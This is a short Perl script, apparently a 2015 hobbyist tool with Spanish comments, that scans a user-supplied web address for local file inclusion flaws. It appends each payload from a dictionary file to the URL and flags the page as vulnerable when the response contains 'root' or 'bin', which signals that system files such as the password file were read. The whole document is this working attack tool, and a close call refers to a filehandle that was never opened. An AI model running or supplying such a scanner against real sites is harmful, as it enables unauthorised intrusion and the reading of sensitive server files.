# By Rodrigo.
# Cheking lfi Beta V0.2
# Actualizado el 24/9/2015 
# 9:58 a.m
use LWP::Simple;
print "\n";
print "[!]Example : www.target.com/php.id= \n\n";
print "Introduce tu URL \n";
$patra = <STDIN>;
chomp($patra);
if ($patra !~ /^http:/){
	$patra = 'http://' . $patra;
}
print "\n\n";
$lfidicc = 'mhe/dicclfi.txt';

open ( EXPLOIT , "<$lfidicc");
while (@payload = <EXPLOIT>){
	chomp(@payload);



foreach $payasa(@payload){

	$newurl = $patra.$payasa;

	$pagina_codigo = LWP::Simple::get($newurl);

if ( $pagina_codigo =~ /root/ ||
	 $pagina_codigo =~ /bin/  ){
	print "[+] Vulnerable -> $newurl\n\n";

}
else {
	print "[-] No vulnerable -> $newurl\n\n";
}

}
close(LFI);
}


